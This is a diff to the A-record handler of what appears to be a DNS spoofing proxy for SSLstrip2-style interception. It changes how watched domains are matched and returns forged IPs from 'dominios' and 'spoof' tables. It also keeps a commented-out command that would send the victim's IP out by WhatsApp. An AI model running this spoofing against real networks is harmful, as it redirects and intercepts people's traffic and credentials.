@@ -517,39 +517,40 @@ def std_A_qry(msg, prov_ip):
 
         host = qname.lower()
 
-        dom1 = None
-        dominio = None
+        # dom1 = None
+        # dominio = None
 
-        punto1 = host.rfind(".")
-        punto2 = host.rfind(".",0,punto1-1)
+        # punto1 = host.rfind(".")
+        # punto2 = host.rfind(".",0,punto1-1)
 
-        if punto1 > -1:
-            dom1 = host[punto1:]
+        # if punto1 > -1:
+        #     dom1 = host[punto1:]
 
-        if punto2 > -1:
-            dominio = host[punto2:]
+        # if punto2 > -1:
+        #     dominio = host[punto2:]
 
 
-        # punto = host.find(".")
-        # dominio = host[punto:]
+        find_host = None
+        for d in dominios:
+            if d in host:
+                find_host = d
 
-        if (dominio in dominios) or (dom1 in dominios):
+        if (find_host is not None):
             ttl = 1
-            id = host[:punto2]
-            if dom1 in dominios:
-                id = host[:punto1]
-                dominio = dom1
+            # id = host[:punto2]
+            # if dom1 in dominios:
+            #     id = host[:punto1]
+            #     dominio = dom1
 
-            if not id=='www':
-                DEBUGLOG('Alert domain! ID: ' + host)
-                # Here the HANDLE!
-                #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
-                handler_msg(host)
+            DEBUGLOG('Alert domain! ID: ' + host)
+            # Here the HANDLE!
+            #os.popen("python /yowsup/yowsup-cli -c /yowsup/config -s <number> \"Host %s\nIP %s\" > /dev/null &"%(id,prov_ip));
+            handler_msg(host)
             save_req(LOGALERTFILE, 'Alert domain! ID: ' + host + '\n')
             
             if host not in spoof:
-                DEBUGLOG('Responding with IP = ' + dominios[dominio])
-                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[dominio])
+                DEBUGLOG('Responding with IP = ' + dominios[find_host])
+                rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, dominios[find_host])
             else:
                 DEBUGLOG('Responding with IP = ' + spoof[host])
                 rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, spoof[host])
@@ -568,6 +569,8 @@ def std_A_qry(msg, prov_ip):
         ips = respuestas(qname.lower(), 'A')
         if qname.lower() not in spoof and isinstance(ips, numbers.Integral):
         # SSLSTRIP2 transformation
+            punto = host.find(".")
+            dominio = host[punto:]
             host2 = ''
             if host[:5] == 'wwww.' or host[:7] == 'social.':
                 host2 = 'www%s' % dominio
